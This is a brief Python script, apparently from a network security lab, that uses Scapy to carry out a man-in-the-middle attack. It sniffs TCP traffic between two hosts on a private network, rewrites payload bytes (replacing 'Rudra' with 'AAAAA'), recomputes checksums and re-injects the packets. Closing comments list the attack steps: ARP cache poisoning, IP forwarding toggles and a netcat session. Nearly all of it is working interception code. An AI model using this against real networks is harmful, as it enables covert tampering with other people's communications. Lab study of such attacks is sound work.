#!/usr/bin/python3

from scapy.all import *
#from scapy.layers.l2 import Ether, ARP

A_IP='10.0.2.15'
A_MAC='08:00:27:e9:cd:6b'
B_IP='10.0.2.4'
B_MAC='08:00:27:af:c0:73'
M_IP='10.0.2.5'
M_MAC='08:00:27:de:41:03'

def spoof_pkt(pkt):
    if pkt[IP].src==A_IP and pkt[IP].dst==B_IP and pkt[TCP].payload:
        old_data= pkt[TCP].payload.load
        new_data=old_data.replace(b'Rudra', b'AAAAA') # Modify old data
        newpkt=IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        newpkt=newpkt/new_data
        newpkt.show()
        send(newpkt, verbose=False) # send spoofed packet
    elif pkt[IP].src==B_IP and pkt[IP].dst==A_IP:
        newpkt=pkt[IP]
        send(newpkt, verbose=False)

pkt=sniff(filter='tcp',prn=spoof_pkt)

# Test steps
# sudo sysctl net.ipv4.ip_forward=1
# Poision ARP cache
# Establish nc session
# Poision ARP cache
# sudo sysctl net.ipv4.ip_forward=0
# Run this program